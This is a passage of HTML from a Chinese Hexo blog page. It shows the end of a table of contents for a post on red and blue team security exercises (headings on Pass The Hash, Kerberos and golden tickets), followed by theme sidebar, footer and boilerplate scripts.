toc-level-5"><a class="toc-link" href="#SMB-%E5%8D%8F%E8%AE%AE-CIFS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.3.3.2.2.</span> <span class="toc-text">SMB 协议&#x2F;CIFS 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8smb"><span class="toc-number">4.3.3.2.2.1.</span> <span class="toc-text">为什么使用smb</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.3.3.2.3.</span> <span class="toc-text">SSH 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WinRM%EF%BC%88Windows-Remote-Managerment%EF%BC%89"><span class="toc-number">4.3.3.2.4.</span> <span class="toc-text">WinRM（Windows Remote Managerment）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#WinRM-%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.3.2.4.1.</span> <span class="toc-text">WinRM 可以做什么</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Pass-The-Hash%EF%BC%88PTH%EF%BC%89"><span class="toc-number">4.3.3.2.5.</span> <span class="toc-text">Pass The Hash（PTH）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%9A%84-PTH-%E6%80%9D%E8%B7%AF"><span class="toc-number">4.3.3.2.5.1.</span> <span class="toc-text">不同的 PTH 思路</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">4.4.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.4.1.</span> <span class="toc-text">域渗透前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%9F%9F"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">什么是域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">什么是域控制器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">什么是活动目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSAM"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">什么是SAM</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-%E8%AE%A4%E8%AF%81"><span class="toc-number">4.4.2.</span> <span class="toc-text">kerberos 认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84PTH%E6%94%BB%E5%87%BB%E2%80%93PTT"><span class="toc-number">4.4.3.</span> <span class="toc-text">域环境的PTH攻击–PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.4.3.1.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%87%91%E7%A5%A8%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.4.3.1.1.</span> <span class="toc-text">制作金票的条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.4.3.1.2.</span> <span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.4.3.2.</span> <span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%93%B6%E7%A5%A8%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.4.3.2.1.</span> <span class="toc-text">制作银票的条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">4.4.3.2.2.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.4.3.3.</span> <span class="toc-text">黄金票据与白银票据的区别</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E7%94%B2%E6%96%B9HVV%E5%87%86%E5%A4%87"><span class="toc-number">5.</span> <span class="toc-text">传统甲方HVV准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">资产梳理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">5.1.1.</span> <span class="toc-text">面临的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.2.</span> <span class="toc-text">解决思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5"><span class="toc-number">5.2.</span> <span class="toc-text">资产问题排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5"><span class="toc-number">5.2.1.</span> <span class="toc-text">基线检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lol%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F"><span class="toc-number">5.2.2.</span> <span class="toc-text">Lol基础扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E5%A4%87%E4%BB%BD"><span class="toc-number">5.2.3.</span> <span class="toc-text">溯源备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A3%E4%BB%BB%E5%88%92%E5%88%86"><span class="toc-number">5.2.4.</span> <span class="toc-text">责任划分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%9A%BE%E7%82%B9"><span class="toc-number">5.2.5.</span> <span class="toc-text">解决难点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88"><span class="toc-number">5.3.</span> <span class="toc-text">应急预案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88"><span class="toc-number">5.3.1.</span> <span class="toc-text">历史漏洞应急预案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1day%E6%88%96nday%E6%94%BB%E5%87%BB%E9%A2%84%E6%A1%88"><span class="toc-number">5.3.2.</span> <span class="toc-text">1day或nday攻击预案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%9A%BE%E7%82%B9-1"><span class="toc-number">5.3.3.</span> <span class="toc-text">解决难点</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/" title="红队蓝队hvv">红队蓝队hvv</a><time datetime="2024-04-15T08:08:31.549Z" title="发表于 2024-04-15 16:08:31">2024-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/15/hello-world%20-%20%E5%89%AF%E6%9C%AC/" title="辅导时间李逵负荆雷克萨杜拉拉开发打撒">辅导时间李逵负荆雷克萨杜拉拉开发打撒</a><time datetime="2024-04-15T08:05:11.668Z" title="发表于 2024-04-15 16:05:11">2024-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/11/hello-world/" title="Hello World">Hello World</a><time datetime="2024-04-11T13:12:25.974Z" title="发表于 2024-04-11 21:12:25">2024-04-11</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="John Doe" target="_blank">John Doe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 John Doe 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>